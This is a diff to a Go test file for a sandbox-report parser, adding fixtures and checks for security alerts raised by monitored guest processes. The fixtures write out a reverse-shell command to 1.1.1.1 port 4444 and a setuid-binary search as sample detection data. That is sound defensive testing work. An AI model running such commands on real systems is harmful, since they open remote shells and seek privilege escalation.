@@ -11,6 +11,7 @@ import (
 	"os"
 	"path/filepath"
 	"reflect"
+	"regexp"
 	"sort"
 	"strings"
 	"sync"
@@ -168,6 +169,11 @@ func TestParseSandboxReport(t *testing.T) {
 		"privesc\tabsent\t3\tsudo\tbash",
 		"commands\t2500",
 		"exec\t1\tid", "exec\t3\tfind / -perm -4000",
+		"section\talerts",
+		"alert\treverse_shell\t1\tbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\tpython3",
+		"alert\tconnect\t2\t1.1.1.1:53 (dns)\tcurl",
+		"alert\tkind_from_a_newer_image\t1\tsomething\tsh",
+		"alert\taudit_health\t1\tthe disk is nearly full: 90 MB free, audit stops recording below 50 MB\tauditd",
 		"file\t/home/dev/.bashrc", "dir\t/tmp",
 		"work\tfile\t.v/\t203", "work\tfile\tout.txt\t1", "work\tdir\t.v/\t33",
 		"proc\t812\tsleep 999",
@@ -179,7 +185,7 @@ func TestParseSandboxReport(t *testing.T) {
 	r := parseSandboxReport(tsv)
 	r.Connections = []sandboxConn{{Protocol: "udp", Dst: "1.1.1.1", DstPort: 53, Count: 4, Reason: "egress"}}
 	r.summarize()
-	want := sandboxSummary{DecoysRead: 1, VMProbes: 2, EvasionSuspected: true, Privesc: 2, Commands: 2500, ChangedOutsideWork: 2, ProcessesLeft: 1, Listening: 1, ConnectionsRefused: 4, AddressesAnAgent: 1}
+	want := sandboxSummary{DecoysRead: 1, VMProbes: 2, EvasionSuspected: true, Privesc: 2, Commands: 2500, Alerts: 4, ChangedOutsideWork: 2, ProcessesLeft: 1, Listening: 1, ConnectionsRefused: 4, AddressesAnAgent: 1}
 	if r.Summary != want {
 		t.Errorf("summary = %+v\nwant      %+v", r.Summary, want)
 	}
@@ -188,6 +194,20 @@ func TestParseSandboxReport(t *testing.T) {
 	}
 	if len(r.Commands) != 2 || r.Commands[1] != (sandboxCommand{3, "find / -perm -4000"}) {
 		t.Errorf("commands = %+v", r.Commands)
+	}
+	wantAlerts := []sandboxAlert{
+		{Kind: "reverse_shell", Severity: "high", Count: 1, What: "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1", By: "python3"},
+		{Kind: "connect", Severity: "info", Count: 2, What: "1.1.1.1:53 (dns)", By: "curl"},
+		{Kind: "kind_from_a_newer_image", Severity: "warn", Count: 1, What: "something", By: "sh"},
+		{Kind: "audit_health", Severity: "warn", Count: 1, What: "the disk is nearly full: 90 MB free, audit stops recording below 50 MB", By: "auditd"},
+	}
+	if len(r.Alerts) != len(wantAlerts) {
+		t.Fatalf("alerts = %+v", r.Alerts)
+	}
+	for i, a := range wantAlerts {
+		if r.Alerts[i] != a {
+			t.Errorf("alert %d = %+v, want %+v", i, r.Alerts[i], a)
+		}
 	}
 	if r.Processes[0] != (sandboxProc{812, "sleep 999"}) {
 		t.Errorf("processes = %+v", r.Processes)
@@ -199,6 +219,36 @@ func TestParseSandboxReport(t *testing.T) {
 	r2.summarize()
 	if r2.Summary.VMProbes != 1 || r2.Summary.EvasionSuspected {
 		t.Errorf("cpuinfo alone: %+v", r2.Summary)
+	}
+}
+
+// Every kind the image's tools emit is one this CLI knows: its severity and
+// what it means are here, not in the guest.
+func TestAlertKindsKnown(t *testing.T) {
+	emitted := map[string]bool{}
+	for _, f := range []string{"mh-sandbox-lib", "mh-sandbox-report"} {
+		b, err := os.ReadFile("../../sandbox/sbin/" + f)
+		must(t, err)
+		for _, m := range regexp.MustCompile(`alert\("([a-z_]+)"|alert\\t([a-z_]+)\\t`).FindAllStringSubmatch(string(b), -1) {
+			emitted[m[1]+m[2]] = true
+		}
+	}
+	// chosen by a conditional in classify
+	for _, k := range []string{"privesc_attempt", "namespace", "ptrace", "dropper", "dropped_exec"} {
+		emitted[k] = true
+	}
+	if len(emitted) < 10 {
+		t.Fatalf("found only %v in the guest's tools", emitted)
+	}
+	for k := range emitted {
+		if _, ok := alertKinds[k]; !ok {
+			t.Errorf("the image emits alert kind %q, unknown to alertKinds", k)
+		}
+	}
+	for k, v := range alertKinds {
+		if v.Title == "" || v.Means == "" {
+			t.Errorf("alertKinds[%q] needs a title and a meaning", k)
+		}
 	}
 }
 
